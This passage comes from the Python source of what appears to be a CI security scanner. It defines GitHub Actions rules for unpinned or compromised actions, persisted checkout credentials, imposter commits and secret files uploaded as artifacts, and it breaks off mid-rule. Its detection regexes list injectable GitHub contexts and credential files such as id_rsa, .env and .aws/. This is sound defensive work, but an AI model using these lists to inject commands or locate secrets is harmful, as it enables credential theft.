"""GitHub Actions security rules — Dependency Chain Abuse and Poisoned Pipeline Execution.

These two categories cover the exact attack vectors used in documented supply chain campaigns.
"""

import re

from taintly.models import (
    CompromisedActionPattern,
    ContextPattern,
    Platform,
    RegexPattern,
    Rule,
    Severity,
)
from taintly.parsers.segmentation import for_each_step
from taintly.platform import github_archived_check, github_sha_verify
from taintly.structural_pattern import StructuralPattern

# ---------------------------------------------------------------------------
# Regex-equivalent predicates the StructuralPattern rules call.
# Kept module-local so each predicate sits next to the rule that
# uses it: structural target on the right, predicate body here.
# ---------------------------------------------------------------------------

_FULL_SHA_RE = re.compile(r"^[a-f0-9]{40}$")
_BRANCH_REF_NAMES = frozenset({"main", "master", "develop", "dev"})

# First-party GitHub-published action namespaces.  The supply-chain
# threat model that motivates SEC3-GH-001 (force-push over a tag,
# maintainer compromise) applies in principle to any action; in
# practice GitHub-controlled namespaces are administered by the
# platform operator and tag-pinning here is industry-standard
# practice (every Microsoft / AWS / Google / dotnet repository in
# the corpus tag-pins these).  Firing HIGH on every
# ``actions/checkout@v4`` produces severe FP-density without
# precision gain — the same threat is more usefully reported via
# SEC3-GH-006 (third-party inventory).
# First-party action publishers — actions in these orgs are
# operationally trusted (the platform vendor itself or a vendor-
# equivalent foundation).  SEC3-GH-001 silences fires here so the
# rule's HIGH severity is reserved for genuinely third-party
# unpinned actions; SEC3-GH-006's inventory review is the right
# channel if a strict-pinning policy needs to enumerate first-party
# actions for SHA pinning.
#
# Adding to this set is a trust-posture decision — the org must be
# the documented vendor for the platforms / ecosystems we cover, not
# just a popular third-party.
_FIRST_PARTY_ACTION_ORGS = frozenset(
    {
        "actions",  # GitHub itself
        "github",  # GitHub secondary org
        "aws-actions",  # AWS official
        "azure",  # Azure / Microsoft official
        "google-github-actions",  # Google Cloud official
        "googleapis",  # Google official
        "pypa",  # Python Packaging Authority
    }
)

# Attacker-controlled GitHub-context expressions that turn an
# unguarded ``run:`` interpolation into shell injection.  Kept in
# sync with ``_TAINTED_CONTEXTS`` in ``taintly/taint.py``: any
# attacker-controlled context shape catchable by the cross-step
# taint analyzer must also be catchable directly here, otherwise
# the same byte appearing inline (without an intermediate ``env:``
# hop) goes unflagged.
_DANGEROUS_GITHUB_CONTEXT_RE = re.compile(
    r"\$\{\{\s*github\.("
    r"event\.("
    r"issue\.(title|body)|"
    r"discussion\.(title|body)|"
    r"pull_request\.(title|body|head\.(ref|label|repo\.default_branch)|user\.login)|"
    r"comment\.body|"
    r"review\.body|"
    r"review_comment\.body|"
    r"head_commit\.(message|(author|committer)\.(email|name))|"
    r"commits|"
    r"pages|"
    # ``workflow_run.head_branch`` is the branch name of the
    # upstream workflow's checkout.  For workflow_run triggered
    # by a fork PR's workflow, it carries the fork's branch
    # name -- attacker-controlled at the same layer as
    # ``head_ref``.
    r"workflow_run\.head_branch"
    r")|"
    r"head_ref"
    r")"
)


# ---------------------------------------------------------------------------
# SEC4-GH-005 — actions/checkout downstream-credential-consumer detector
# ---------------------------------------------------------------------------
#
# The previous rule fired on every actions/checkout that didn't
# explicitly set ``persist-credentials: false`` — corpus baseline
# showed ~80% of fires were FP-density (the persisted credential
# died with the runner, no later step used it).  That tradeoff is
# why the severity is LOW in the bare form (no downstream consumer).
#
# The path forward documented at the time was: fire only when a
# downstream step in the same job actually consumes the persisted
# credential.  Implementing that requires a job-scoped scan, which
# this custom pattern provides.

_CHECKOUT_USES_RE = re.compile(r"uses:\s*actions/checkout@", re.IGNORECASE)
# YAML boolean false accepts ``false``/``False``/``FALSE`` and
# ``no``/``No``/``NO``; quote the value or not.  IGNORECASE matches
# all surface forms.
_PERSIST_FALSE_RE = re.compile(
    r"""persist-credentials:\s*['"]?(?:false|no)['"]?\b""",
    re.IGNORECASE,
)
# Shell git operations that consume the persisted credential.
# - ``git push`` / ``git push origin foo``
# - ``git fetch <url>`` for cross-repo where the persisted helper is reused
# - ``git config user.email`` / ``git config user.name`` — these only
#   matter when a subsequent ``git push`` is run, but their presence
#   is a strong signal the workflow is preparing to push.
# - ``gh release create`` — uses ``GITHUB_TOKEN`` from the env, but
#   not from .git/config; intentionally NOT a consumer.
_GIT_CREDENTIAL_OP_RE = re.compile(r"\bgit\s+(?:push|fetch\s+(?:https?://|ssh://|git@))\b")
# Actions whose documented behaviour is to either reuse the persisted
# checkout token directly (a ``git push`` under the hood) OR to package
# the working tree — including the ``.git/`` directory whose ``config``
# now references the token helper — into a publish/release/PR artifact
# that leaves the runner.  Both shapes are credential consumers under
# the artipacked threat model:
#
# - ``peaceiris/actions-gh-pages``, ``crazy-max/ghaction-github-pages``,
#   ``JamesIves/github-pages-deploy-action``, ``s0/git-publish-subdir-action``,
#   ``cpina/github-action-push-to-another-repository``,
#   ``ad-m/github-push-action``, ``stefanzweifel/git-auto-commit-action``,
#   ``EndBug/add-and-commit`` — direct git-push consumers.
# - ``peter-evans/create-pull-request`` — pushes a new branch via the
#   persisted helper to open the PR.
# - ``pypa/gh-action-pypi-publish`` — uploads the built wheel/sdist to
#   PyPI; if the working tree's ``.git/`` (with the token-helper config
#   reference) is included in the bundle, the token leaks via the
#   published artifact.  Same shape covers the ``cibuildwheel`` →
#   ``pypa-publish`` two-step (publish step is the consumer).
# - ``softprops/action-gh-release`` — uploads release assets to a tag;
#   same artifact-credential-leak shape as pypa-publish.
_GIT_PUSH_ACTION_RE = re.compile(
    r"uses:\s*(?:"
    r"peaceiris/actions-gh-pages"
    r"|ad-m/github-push-action"
    r"|stefanzweifel/git-auto-commit-action"
    r"|EndBug/add-and-commit"
    r"|crazy-max/ghaction-github-pages"
    r"|JamesIves/github-pages-deploy-action"
    r"|s0/git-publish-subdir-action"
    r"|cpina/github-action-push-to-another-repository"
    r"|peter-evans/create-pull-request"
    r"|pypa/gh-action-pypi-publish"
    r"|softprops/action-gh-release"
    r")",
    re.IGNORECASE,
)
_LINE_COMMENT_RE = re.compile(r"^\s*#")
_HEREDOC_RE = re.compile(r"<<-?\s*['\"]?([A-Za-z_][\w-]*)['\"]?")


def _credential_consumer_surface(lines: list[str]) -> str:
    """Return executable-ish lines for the credential-consumer check.

    This deliberately avoids treating comments and heredoc payload
    text as downstream credential use.  It is still regex-based, but it
    keeps SEC4-GH-005 from firing on prose or scripts merely written to
    disk.
    """
    surface: list[str] = []
    heredoc_end: str | None = None
    for line in lines:
        stripped = line.strip()
        if heredoc_end:
            if stripped == heredoc_end:
                heredoc_end = None
            continue
        if _LINE_COMMENT_RE.match(line):
            continue
        code = line.split("#", 1)[0]
        surface.append(code)
        m = _HEREDOC_RE.search(code)
        if m:
            heredoc_end = m.group(1)
    return "\n".join(surface)


class _CheckoutDownstreamCredentialConsumerPattern:
    """Pattern for SEC4-GH-005 — downstream-consumer form.

    Fires when ALL of:

    * a step uses ``actions/checkout@<ref>`` AND
    * that step does NOT explicitly set ``persist-credentials: false``
      within an 8-line lookahead AND
    * a subsequent step IN THE SAME JOB consumes the persisted
      credential — either a ``git push`` / ``git fetch <url>`` /
      ``git config user`` shell op, OR a documented git-pushing
      action (peaceiris/actions-gh-pages, ad-m/github-push-action,
      stefanzweifel/git-auto-commit-action, etc.).

    "Same job" is determined via ``_split_into_job_segments`` so a
    sibling job's git push doesn't false-trigger a finding on this
    job's checkout.

    Conforms to ``PatternProtocol``.
    """

    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
        from taintly.models import _split_into_job_segments

        results: list[tuple[int, str]] = []
        for seg_start, seg_lines in _split_into_job_segments(lines):
            seg_text = _credential_consumer_surface(seg_lines)
            has_consumer = bool(_GIT_CREDENTIAL_OP_RE.search(seg_text)) or bool(
                _GIT_PUSH_ACTION_RE.search(seg_text)
            )
            if not has_consumer:
                continue
            for j, line in enumerate(seg_lines):
                if _LINE_COMMENT_RE.match(line):
                    continue
                if not _CHECKOUT_USES_RE.search(line):
                    continue
                window = "\n".join(seg_lines[j : j + 8])
                if _PERSIST_FALSE_RE.search(window):
                    continue
                downstream = _credential_consumer_surface(seg_lines[j + 1 :])
                if not (
                    _GIT_CREDENTIAL_OP_RE.search(downstream)
                    or _GIT_PUSH_ACTION_RE.search(downstream)
                ):
                    continue
                results.append((seg_start + j + 1, line.strip()))
        return results


# ``on:`` fork-reachable trigger detector for SEC4-GH-005B.  The posture
# sibling stays out of push-only release workflows where persisted credentials
# are operator-controlled.
_FORK_REACHABLE_TRIGGER_RE = re.compile(
    r"(?ms)^on:\s*(?:\n\s+|\[?\s*|\{?\s*).*?"
    r"(?:pull_request|pull_request_target|issue_comment|workflow_run)",
)


class _CheckoutNoPersistPostureSiblingPattern:
    """Pattern for SEC4-GH-005B, the INFO posture sibling of SEC4-GH-005."""

    def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
        from taintly.models import _split_into_job_segments

        if not _FORK_REACHABLE_TRIGGER_RE.search(content):
            return []

        results: list[tuple[int, str]] = []
        for seg_start, seg_lines in _split_into_job_segments(lines):
            seg_text = _credential_consumer_surface(seg_lines)
            seg_has_consumer = bool(_GIT_CREDENTIAL_OP_RE.search(seg_text)) or bool(
                _GIT_PUSH_ACTION_RE.search(seg_text)
            )
            for j, line in enumerate(seg_lines):
                if _LINE_COMMENT_RE.match(line):
                    continue
                if not _CHECKOUT_USES_RE.search(line):
                    continue
                window = "\n".join(seg_lines[j : j + 8])
                if _PERSIST_FALSE_RE.search(window):
                    continue
                if seg_has_consumer:
                    downstream = _credential_consumer_surface(seg_lines[j + 1 :])
                    if _GIT_CREDENTIAL_OP_RE.search(downstream) or _GIT_PUSH_ACTION_RE.search(
                        downstream
                    ):
                        continue
                results.append((seg_start + j + 1, line.strip()))
        return results


def _has_dangerous_github_context(value: str, _value_kind: str, _path: tuple[object, ...]) -> bool:
    """Predicate for SEC4-GH-004 (script injection).

    The ``**.run`` path query already filters to step ``run:``
    keys, so this predicate only needs to detect the dangerous
    GitHub-context expressions inside the shell-string value.
    The original regex's exclusion for "value is just the
    expression alone passed to a non-shell key" is not needed
    here — the path filter does the structural job the regex was
    approximating.
    """
    return bool(_DANGEROUS_GITHUB_CONTEXT_RE.search(value))


def _is_unpinned_uses_value(value: str, _value_kind: str, _path: tuple[object, ...]) -> bool:
    """Predicate for SEC3-GH-001 (unpinned action).

    Equivalent to the regex
    ``uses:\\s*([^@\\s]+)@(?![a-f0-9]{40}\\b)(\\S+)`` plus the
    historical exclude list (``./``, ``../``, ``docker://``,
    branch-ref dedup with SEC3-GH-002).
    """
    v = value.strip()
    if not v or "@" not in v:
        return False
    # Local action references (./local-action, ../shared) — not
    # remote, not a supply-chain risk in this rule's scope.
    if v.startswith(("./", "../")):
        return False
    if v.startswith("docker://"):
        return False
    head, _, ref = v.partition("@")
    if not ref:
        return False
    # First-party allowlist: platform-vendor-published action
    # namespaces are operationally trusted; SEC3-GH-006 is the right
    # channel for any inventory review of these.  GitHub matches
    # ``uses:`` owner/repo case-insensitively, so we lowercase to
    # match the set's canonical form.
    org = head.split("/", 1)[0].lower() if "/" in head else ""
    if org in _FIRST_PARTY_ACTION_ORGS:
        return False
    # Branch refs are SEC3-GH-002's CRITICAL scope; don't double-
    # report at HIGH here.
    ref_token = ref.split()[0].split("#")[0]
    if ref_token in _BRANCH_REF_NAMES:
        return False
    return not _FULL_SHA_RE.match(ref_token)


# ---------------------------------------------------------------------------
# SEC3-GH-009 — imposter-commit detection (opt-in, network-dependent)
# ---------------------------------------------------------------------------
#
# A ``uses: owner/repo@<sha>`` reference pinned to a 40-character hex
# SHA gives strong supply-chain integrity ONLY when the SHA is
# reachable from a ref in the action's repository.  When the
# maintainer force-pushes over the tag the SHA pointed at — or the SHA
# was published transiently and later garbage-collected — the
# reference resolves to an orphan commit that no audit trail covers.
# The action's repo no longer has the code review record that
# produced the SHA, and a future ref recreation could rebind the SHA
# to attacker-controlled content.
#
# The rule is opt-in (``--check-imposter-commits`` CLI flag) because
# verification requires per-action GitHub API calls; documentation
# recommends running it on a weekly cron rather than per-PR.

_USES_SHA_RE = re.compile(
    # ``uses: owner/repo@<40-char hex>`` with optional surrounding
    # whitespace and an optional trailing comment.  We require the
    # 40-char hex form because anything shorter is necessarily a tag
    # or branch (SEC3-GH-001 covers those).
    r"\buses:\s+([A-Za-z0-9-]+)/([A-Za-z0-9._-]+)@([0-9a-fA-F]{40})\b"
)


# ---------------------------------------------------------------------------
# SEC3-GH-010 — archived-repo detection (opt-in, network-dependent)
# ---------------------------------------------------------------------------
#
# A ``uses: owner/repo@<ref>`` reference whose target repository has
# been archived on GitHub.  Archived repos are read-only — no new
# releases, no security patches, no maintainer response to compromise
# reports.  The check is opt-in via ``--check-archived-actions`` (per-
# action GitHub API calls).

_USES_OWNER_REPO_RE = re.compile(
    r"\buses:\s+([A-Za-z0-9][\w-]*)/([A-Za-z0-9][\w.-]*)(?:/[\w./-]+)?@\S+"
)


class ArchivedActionPattern:
    """Pattern for SEC3-GH-010.  Gated by
    :func:`github_archived_check.is_enabled`.  Skips first-party orgs.
    Conforms to ``PatternProtocol``."""

    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
        if not github_archived_check.is_enabled():
            return []
        seen: set[tuple[str, str, int]] = set()
        results: list[tuple[int, str]] = []
        for i, line in enumerate(lines):
            stripped = line.lstrip()
            if stripped.startswith("#"):
                continue
            m = _USES_OWNER_REPO_RE.search(line)
            if not m:
                continue
            owner, repo = m.group(1), m.group(2)
            if owner.lower() in _FIRST_PARTY_ACTION_ORGS:
                continue
            key = (owner.lower(), repo.lower(), i + 1)
            if key in seen:
                continue
            seen.add(key)
            verdict = github_archived_check.is_archived(owner, repo)
            if verdict is True:
                snippet = (
                    f"{owner}/{repo} is archived on GitHub — no new releases, "
                    f"no security patches, no maintainer response to compromise."
                )
                results.append((i + 1, snippet))
        return results


class ImposterCommitPattern:
    """Pattern that fires on ``uses: owner/repo@<sha>`` whose SHA is
    not reachable from any ref in the action's repository.

    Conforms to ``PatternProtocol``: ``check(content, lines) ->
    list[(line_number, snippet)]``.

    Behaviour is gated by :func:`github_sha_verify.is_enabled`.  When
    disabled (the default), ``check`` returns ``[]`` immediately —
    the rule is silent under normal scans.  When enabled, each
    matched SHA is verified via :func:`github_sha_verify.is_sha_reachable`
    (which caches verdicts process-wide).
    """

    def check(self, _content: str, lines: list[str]) -> list[tuple[int, str]]:
        if not github_sha_verify.is_enabled():
            return []
        results: list[tuple[int, str]] = []
        for i, line in enumerate(lines):
            # Comments don't reach the workflow runner — skip.
            stripped = line.lstrip()
            if stripped.startswith("#"):
                continue
            m = _USES_SHA_RE.search(line)
            if not m:
                continue
            owner, repo, sha = m.group(1), m.group(2), m.group(3)
            verdict = github_sha_verify.is_sha_reachable(owner, repo, sha.lower())
            if verdict is False:
                # Definitive 404 — orphan.  Indeterminate outcomes
                # (rate-limit, transport error) bypass emission so a
                # network blip never produces a false-positive SEC3
                # finding.
                snippet = (
                    f"{owner}/{repo}@{sha[:12]} not reachable from any ref "
                    f"in {owner}/{repo} (orphan SHA — force-push over tag "
                    f"or garbage-collected commit)"
                )
                results.append((i + 1, snippet))
        return results


_TRUSTED_FIRST_PARTY_OWNERS: frozenset[str] = frozenset(
    {
        "actions",  # GitHub itself
        "github",  # GitHub secondary org
        "dependabot",  # GitHub-operated (Dependabot)
        "aws-actions",  # AWS official
        "azure",  # Azure / Microsoft official
        "google-github-actions",  # Google Cloud official
        "googleapis",  # Google official
        "pypa",  # Python Packaging Authority (foundation)
    }
)


_FIRST_PARTY_OWNER_PREFIX_RE = (
    r"uses:\s*['\"]?(?:" + "|".join(sorted(_TRUSTED_FIRST_PARTY_OWNERS)) + r")/"
)


def _unpinned_classify(value: str) -> str:
    """Classify a ``uses:`` value into one of three buckets:

    * ``"third_party"`` — unpinned, owner not in
      ``_TRUSTED_FIRST_PARTY_OWNERS``.  HIGH severity (SEC3-GH-001).
    * ``"first_party"`` — unpinned, owner in
      ``_TRUSTED_FIRST_PARTY_OWNERS``.  LOW + ``review_needed=True``
      (SEC3-GH-001A) — flagged for trust-posture review, not
      confirmed risk.
    * ``""`` (empty string) — does not match the rule (pinned to
      40-char SHA, local action, docker URI, branch ref, a
      reusable-workflow call, or absent ``@``).  Caller should not fire
      either rule.
    """
    v = value.strip()
    if not v or "@" not in v:
        return ""
    if v.startswith(("./", "../")):
        return ""
    if v.startswith("docker://"):
        return ""
    head, _, ref = v.partition("@")
    if not ref:
        return ""
    # Reusable-workflow calls (owner/repo/.github/workflows/x.yml@ref)
    # are SEC8-GH-003's territory — not an action. Classifying them
    # here double-fires SEC3-GH-001 alongside SEC8-GH-003 on the same
    # unpinned line.
    if "/.github/workflows/" in head:
        return ""
    # Branch refs are SEC3-GH-002's scope; don't double-report here.
    ref_token = ref.split()[0].split("#")[0]
    if ref_token in _BRANCH_REF_NAMES:
        return ""
    if _FULL_SHA_RE.match(ref_token):
        return ""
    owner = head.split("/", 1)[0].lower()
    if owner in _TRUSTED_FIRST_PARTY_OWNERS:
        return "first_party"
    return "third_party"


def _is_unpinned_third_party_action(
    value: str, _value_kind: str, _path: tuple[object, ...]
) -> bool:
    """Predicate for SEC3-GH-001 (unpinned third-party action).

    Fires when the action's owner is NOT in
    ``_TRUSTED_FIRST_PARTY_OWNERS``.  Confirmed-risk supply-chain
    finding at HIGH severity.
    """
    return _unpinned_classify(value) == "third_party"


_UPLOAD_ARTIFACT_RE = re.compile(r"uses:\s*\S*upload-artifact", re.IGNORECASE)

# High-confidence private-secret file indicators.  Deliberately conservative:
# ``.pem`` / ``.key`` are excluded because they are just as often *public*
# certificates, which would inflate false positives.  p12/pfx/jks/keystore
# are private-key archives, so they stay.
_SECRET_FILE_RE = re.compile(
    r"(?:^|[\s/'\"=:])("
    r"\.env(?:\.[\w.-]+)?"
    r"|\.npmrc|\.netrc|\.pypirc|\.dockercfg"
    r"|id_rsa|id_ed25519|id_ecdsa|secring\.\w+"
    r"|kubeconfig|\.kube/config"
    r"|credentials(?:\.(?:json|ya?ml|ini))?"
    r"|service[-_]account[\w-]*\.json"
    r"|[\w./-]*\.(?:p12|pfx|keystore|jks)"
    r"|\.aws/|\.ssh/|\.gnupg/"
    r")(?:$|[\s/'\":,])",
    re.IGNORECASE,
)
_PATH_KEY_RE = re.compile(r"^(\s*)path\s*:\s*(.*)$")
_BLOCK_SCALAR = {"|", ">", "|-", ">-", "|+", ">+"}


class SecretsInArtifactPathPattern:
    """Fire when an ``actions/upload-artifact`` step's ``path:`` names a
    private-secret file (``.env``, ``id_rsa``, ``.npmrc``, ``credentials``,
    ``.aws/``, a keystore, …).  Uploaded artifacts are downloadable — on a
    public repo by anyone, on a fork PR by the PR author — so a secret in
    the upload set is an exfiltration channel.

    Distinct from SEC10's artifact rules (which concern *missing* artifacts
    / debug-log upload).  Matches the secret-file *pattern*, not arbitrary
    paths, so ordinary ``path: dist/`` uploads do not fire."""

    def check(self, content: str, _lines: list[str]) -> list[tuple[int, str]]:
        results: list[tuple[int, str]] = []
        for step in for_each_step(content):
            if not _UPLOAD_ARTIFACT_RE.search(step.text):
                continue
            in_path = False
            path_indent = -1
            for offset, line in enumerate(step.body_lines):
                stripped = line.strip()
                if not stripped or stripped.startswith("#"):
                    continue
                m = _PATH_KEY_RE.match(line)
                if m:
                    path_indent = len(m.group(1))
                    inline = m.group(2).strip()
                    in_path = inline in _BLOCK_SCALAR or inline == ""
                    if inline and inline not in _BLOCK_SCALAR and _SECRET_FILE_RE.search(inline):
                        results.append((step.start_line + offset, stripped))
                    continue
                if in_path:
                    cur_indent = len(line) - len(line.lstrip())
                    if cur_indent <= path_indent:
                        in_path = False
                    elif _SECRET_FILE_RE.search(stripped):
                        results.append((step.start_line + offset, stripped))
        return results


RULES: list[Rule] = [
    # =========================================================================
    # SEC3-GH-011: secret file uploaded as a downloadable artifact
    # =========================================================================
    Rule(
        id="SEC3-GH-011",
        title="Private-secret file uploaded as a workflow artifact",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        review_needed=True,
        description=(
            "An ``actions/upload-artifact`` step uploads a path that names a "
            "private-secret file — a ``.env``, an SSH private key "
            "(``id_rsa``), ``.npmrc`` / ``.netrc`` credentials, a cloud "
            "``credentials`` file, a ``.aws/`` or ``.ssh/`` directory, or a "
            "key archive (``.p12``/``.pfx``/``.jks``). Workflow artifacts "
            "are downloadable — publicly on a public repo, and by the PR "
            "author on a fork pull request — so a secret in the upload set "
            "is an exfiltration channel that survives the run."
        ),
        pattern=SecretsInArtifactPathPattern(),
        remediation=(
            "Never include secret-bearing files in an artifact upload. "
            "Scope ``path:`` to build outputs only, and add an exclusion "
            "for secret patterns:\n"
            "\n"
            "    - uses: actions/upload-artifact@<sha>\n"
            "      with:\n"
            "        path: |\n"
            "          dist/\n"
            "          !**/.env\n"
            "          !**/*.p12\n"
        ),
        reference="https://docs.github.com/actions/using-workflows/storing-workflow-data-as-artifacts",
        test_positive=[
            "on: push\njobs:\n  x:\n    steps:\n"
            "      - uses: actions/upload-artifact@v4\n"
            "        with:\n          path: .env\n",
            "on: push\njobs:\n  x:\n    steps:\n"
            "      - uses: actions/upload-artifact@v4\n"
            "        with:\n          name: keys\n          path: |\n"
            "            dist/\n            secrets/id_rsa\n",
        ],
        test_negative=[
            # Ordinary build output — must not fire.
            "on: push\njobs:\n  x:\n    steps:\n"
            "      - uses: actions/upload-artifact@v4\n"
            "        with:\n          path: dist/\n",
            # Secret-looking path but NOT an upload-artifact step.
            "on: push\njobs:\n  x:\n    steps:\n      - run: cp .env /tmp/backup\n",
            # Public cert extension (.pem) is intentionally not flagged.
            "on: push\njobs:\n  x:\n    steps:\n"
            "      - uses: actions/upload-artifact@v4\n"
            "        with:\n          path: certs/server.pem\n",
        ],
        stride=["I"],
        threat_narrative=(
            "Uploading a secret file as an artifact turns a one-time "
            "in-run credential into a persistent, downloadable copy. On a "
            "public repository the artifact is world-readable; on a fork "
            "PR the very actor who opened the PR can download it — a clean "
            "exfiltration path that leaves the workflow looking green."
        ),
    ),
    # =========================================================================
    # CICD-SEC-3: Dependency Chain Abuse
    # =========================================================================
    Rule(
        id="SEC3-GH-001",
        title="Unpinned third-party action (mutable tag reference)",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "Third-party action referenced by mutable tag instead of commit SHA. Tags "
            "can be force-pushed to point at malicious code — a technique used in "
            "documented supply chain attacks against popular GitHub Actions "
            "(Trivy, Checkmarx, tj-actions).  Sibling rule SEC3-GH-001A covers "
            "unpinned actions from documented first-party publishers (``actions/*``, "
            "``aws-actions/*``, ``azure/*``, etc.) at LOW severity with "
            "``review_needed=True``."
        ),
        pattern=StructuralPattern(
            path="**.uses",
            predicate=_is_unpinned_third_party_action,
        ),
        remediation="Pin to full 40-char commit SHA: uses: org/action@<sha> # vtag",
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
        test_positive=[
            "      - uses: aquasecurity/trivy-action@v0.33.0",
            "      - uses: tj-actions/changed-files@v40",
        ],
        test_negative=[
            "      - uses: aquasecurity/trivy-action@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v0.33.0",
            "      - uses: ./local-action",
            "      - uses: ../shared-action",
            "      # uses: tj-actions/changed-files@v40",
            "      - uses: docker://alpine:3.18",
            # First-party orgs: covered by SEC3-GH-001A, must NOT fire here.
            "      - uses: actions/checkout@v4",
            "      - uses: aws-actions/configure-aws-credentials@v4",
            "      - uses: azure/login@v2",
            # dependabot/* is GitHub-operated — first-party (SEC3-GH-001A).
            "      - uses: dependabot/fetch-metadata@v2",
            # Reusable-workflow calls are SEC8-GH-003's territory, not here.
            "      - uses: some-org/shared/.github/workflows/ci.yml@v4",
        ],
        stride=["T"],
        threat_narrative=(
            "Mutable tags can be force-pushed to point at entirely different commits without any "
            "record in your repository's history, silently changing what code your pipeline executes. "
            "This technique was used in the Trivy, tj-actions/changed-files, and Checkmarx supply "
            "chain compromises of 2024-2026."
        ),
        incidents=[
            "Trivy supply chain (Mar 2026)",
            "tj-actions/changed-files (Mar 2025)",
            "Checkmarx (Mar 2025)",
        ],
    ),
    Rule(
        id="SEC3-GH-002",
        title="Action pinned to branch reference",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "Action referenced by branch name (e.g., @main, @master). Branch references "
            "change with every commit — any push to the branch changes what your workflow runs. "
            "This is the most dangerous form of unpinned reference."
        ),
        pattern=RegexPattern(
            match=r"uses:\s*[^@\s]+@(main|master|develop|dev)(\s*(#.*)?)?\s*$",
            exclude=[r"^\s*#", r"docker://", r"uses:\s*\./"],
        ),
        remediation="Pin to a specific commit SHA, not a branch name.",
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
        test_positive=[
            "      - uses: some-org/deploy@main",
            "      - uses: company/action@master",
            "      - uses: org/tool@develop",
        ],
        test_negative=[
            "      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1",
            "      - uses: actions/checkout@v4",
            "      # uses: org/action@main",
        ],
        stride=["T"],
        threat_narrative=(
            "Branch references change with every commit, meaning any contributor to the action's "
            "repository can silently modify what your workflow runs by pushing a single commit. "
            "An attacker who gains temporary write access — via a compromised maintainer account — "
            "can substitute malicious code that runs with your workflow's full permissions and secrets."
        ),
    ),
    Rule(
        id="SEC3-GH-003",
        title="Known compromised action referenced",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "This workflow references an action that has been compromised in a documented "
            "supply chain attack. Verify you are using a confirmed safe version pinned to SHA."
        ),
        pattern=RegexPattern(
            match=r"uses:\s*(aquasecurity/trivy-action|aquasecurity/setup-trivy|Checkmarx/kics-github-action|Checkmarx/ast-github-action|tj-actions/changed-files)@",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Consult the authoritative GitHub Security Advisory for each incident before "
            "re-enabling the action. Relevant advisories:\n"
            "  - tj-actions/changed-files: GHSA-mrrh-fwg8-r2c3 / CVE-2025-30066\n"
            "  - aquasecurity/trivy-action: GHSA-69fq-xp46-6x23 (Mar 2026)\n"
            "  - Checkmarx/kics-github-action: published via the GitHub Advisory Database\n"
            "Browse: https://github.com/advisories\n"
            "\n"
            "Pin to a confirmed-safe 40-char commit SHA published after remediation, or "
            "replace with an alternative tool. Audit the workflow's full history for the "
            "window the action was present — rotate any secret that the compromised "
            "version could have exfiltrated."
        ),
        reference="https://github.com/advisories",
        test_positive=[
            "      - uses: aquasecurity/trivy-action@v0.33.0",
            "      - uses: tj-actions/changed-files@v35",
            "      - uses: Checkmarx/kics-github-action@v1.7.0",
        ],
        test_negative=[
            "      - uses: actions/checkout@v4",
            "      # uses: aquasecurity/trivy-action@v0.33.0",
        ],
        stride=["T", "I"],
        threat_narrative=(
            "This action was used in a confirmed supply chain attack where attackers modified it "
            "to silently exfiltrate CI secrets from all referencing workflows. "
            "Continuing to reference it keeps a known-compromised actor in your trust chain, "
            "even if you pin to a version predating the incident."
        ),
        incidents=[
            "Trivy supply chain (Mar 2026)",
            "tj-actions/changed-files (Mar 2025)",
            "Checkmarx (Mar 2025)",
        ],
    ),
    # =========================================================================
    # SEC3-GH-004 — known-vulnerable version of action in use (precise match)
    # =========================================================================
    #
    # Distinct from SEC3-GH-003 (always-fire on the package): this rule
    # checks the pinned ``@<ref>`` against the bundled GHSA-sourced
    # advisory list and fires only when the ref is in the affected
    # version range.  ``tj-actions/changed-files@v40`` fires both this
    # AND SEC3-GH-003 (history + active-vulnerable); ``@v46.0.1``
    # (patched) fires SEC3-GH-003 only.  See ``taintly/data/
    # compromised_actions.json`` for the bundled list and
    # ``taintly/advisories.py`` for the matcher.
    Rule(
        id="SEC3-GH-004",
        title="Action pinned to a known-vulnerable version (active GHSA advisory)",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "The workflow pins an action to a ref that falls in the "
            "affected version range of a published GitHub Security "
            "Advisory.  Bundled list refreshed at release time from "
            "``GET /advisories?ecosystem=actions``; current entries "
            "cover the tj-actions/changed-files compromises "
            "(GHSA-mrrh-fwg8-r2c3 / CVE-2025-30066 and the GHSL-2023-271 "
            "command-injection class), the Reviewdog March 2025 "
            "compromise (GHSA-qmg3-hpqr-gqvc / CVE-2025-30154), and "
            "the aquasecurity/trivy-action incidents "
            "(GHSA-69fq-xp46-6x23 / CVE-2026-33634 and "
            "GHSA-9p44-j4g5-cfx5 / CVE-2026-26189)."
        ),
        pattern=CompromisedActionPattern(
            exclude=[
                r"^\s*#",
                r"uses:\s*\./",
                r"uses:\s*\.\./",
                r"docker://",
            ],
        ),
        remediation=(
            "1. Upgrade to the action's first patched version (consult "
            "the GHSA listed in the finding's ``Code:`` field for the "
            "exact bound).\n"
            "2. After upgrading, pin to a 40-char commit SHA published "
            "AFTER the remediation commit so a future tag-force-push "
            "cannot re-introduce the vulnerable version.\n"
            "3. Audit secrets the workflow had access to during the "
            "compromise window — rotate anything the action could have "
            "read.\n"
            "4. Review the full advisory text via "
            "``https://github.com/advisories/<ghsa-id>``."
        ),
        reference="https://github.com/advisories",
        test_positive=[
            # tj-actions/changed-files Mar-2025 compromise (<= 45.0.7).
            "      - uses: tj-actions/changed-files@v40",
            "      - uses: tj-actions/changed-files@v45.0.7",
            # tj-actions GHSL-2023-271 (< 41).
            "      - uses: tj-actions/changed-files@v35",
            # Reviewdog Mar-2025 compromise (== v1).
            "      - uses: reviewdog/action-setup@v1",
            # aquasecurity/trivy-action Trivy compromise (< 0.35.0).
            "      - uses: aquasecurity/trivy-action@v0.33.0",
